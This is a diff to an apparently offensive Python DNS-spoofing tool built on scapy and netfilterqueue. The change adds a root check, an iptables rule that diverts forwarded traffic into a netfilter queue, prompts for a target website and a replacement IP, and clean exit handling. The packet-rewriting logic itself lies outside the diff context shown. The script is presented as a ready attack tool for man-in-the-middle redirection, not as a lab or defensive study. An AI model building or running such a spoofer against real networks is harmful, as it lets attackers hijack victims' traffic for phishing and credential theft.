@@ -3,6 +3,8 @@
 #Imports
 import netfilterqueue
 import scapy.all as scapy
+import sys
+import os
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
@@ -29,6 +31,14 @@ print('''
 ██████╔╝██║░╚███║██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░░░░██╗██║░░░░░░░░██║░░░
 ╚═════╝░╚═╝░░╚══╝╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░░░░░░╚═╝░░░''')
 
+# Check if user is root
+if not os.geteuid()==0:
+    sys.exit('This script must be run as root!')
+else:
+    print("User is root, the script can continue...\n")
+
+os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
+
 website = input("\nWhat website do you want to spoof? > ")
 
 ip_address = input("\nWhat IP address do you want to spoof it as? > ")
@@ -38,4 +48,8 @@ print("\n[+] Starting to spoof...")
 #Main
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)
-queue.run()
+try:
+    queue.run()
+except KeyboardInterrupt:
+    print('\nExitting...')
+    sys.exit(0)
